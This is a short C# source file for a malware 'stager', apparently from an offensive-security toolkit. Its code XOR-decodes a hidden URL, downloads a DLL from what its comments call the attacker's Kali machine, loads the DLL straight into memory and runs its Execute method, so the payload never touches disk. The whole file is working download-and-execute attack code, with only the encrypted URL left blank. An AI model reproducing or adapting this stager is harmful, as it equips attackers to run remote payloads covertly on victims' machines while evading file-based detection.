using System;
using System.Net;
using System.Reflection;


namespace Stager
{

    //stager that downloads an exe or dll from a remote source the source is encrypted with xor, decrypts an runtime and then executes it in memory.
    class Program
    {
        //xor decryption routine
        public static string XORCipher(byte[] data, string key)
        {
            int dataLen = data.Length;
            int keyLen = key.Length;
            char[] output = new char[dataLen];

            for (int i = 0; i < dataLen; ++i)
            {
                output[i] = (char)(data[i] ^ key[i % keyLen]);
            }

            return new string(output);
        }
        static void Main(string[] args)
        {

                //download 
            using (var client = new WebClient())
            {

                // here we input our xor encrypted url
                byte[] text = {};
                //xor key
                string key = "KALAPIGEAUTO";
                string plainText = XORCipher(text, key);
                //downloading the mtk.dll file from kali pc 
                var uri = new Uri(plainText);
                var stage = client.DownloadData(uri);
                //loads the dll file in memory
                var asm = Assembly.Load(stage);
                //find the namespace and then find the Execute method the { } are the parameters if we have any we must specify them
                asm.GetType("Stage.StageEntry").GetMethod("Execute").Invoke(null, new object[] { });

            }


        }
    }
}
